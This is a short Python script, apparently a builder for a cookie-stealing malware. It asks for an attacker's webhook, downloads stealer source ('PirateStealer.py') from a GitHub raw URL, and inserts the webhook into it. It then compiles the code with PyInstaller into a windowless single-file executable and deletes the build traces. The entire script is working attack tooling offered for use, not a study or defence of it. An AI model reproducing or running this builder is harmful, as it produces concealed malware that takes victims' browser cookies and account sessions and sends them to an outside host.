import os
import shutil
import requests
import PyInstaller.__main__

def endHandler():
  os._exit(0)

        
print(''' 
Made By Synthetic#2958
''')
webhookk = input(f"Input Webhook: ")

fileName = input(f"Input File Name: ")

code = requests.get("https://raw.githubusercontent.com/Mani175/Pirate-Cookie-Grabber/main/PirateStealer.py").text.replace("heh", webhookk)
with open(f"{fileName}.py", 'w') as f:
    f.write(code)

print(f"\nCreating {fileName}.exe\n")
os.system(f'title Creating {fileName}.exe')
    #the equivalent to "pyarmor pack -e "--onefile --noconsole  " {fileName}.exe"
PyInstaller.__main__.run([
        '%s.py' % fileName,
        '--name=%s' % fileName,
        '--onefile',
        '--noconsole',
        '--log-level=INFO',
        '--icon=NONE',
    ])
try:
        #clean build files
        shutil.move(f"{os.getcwd()}\\dist\\{fileName}.exe", f"{os.getcwd()}\\{fileName}.exe")
        shutil.rmtree('build')
        shutil.rmtree('dist')
        shutil.rmtree('__pycache__')
        os.remove(f'{fileName}.spec')
        os.remove(f'{fileName}.py')
except FileNotFoundError:
        pass

print(f"\nFile created as {fileName}.exe\n")
input(f'Enter anything to continue . . .  ')
endHandler()
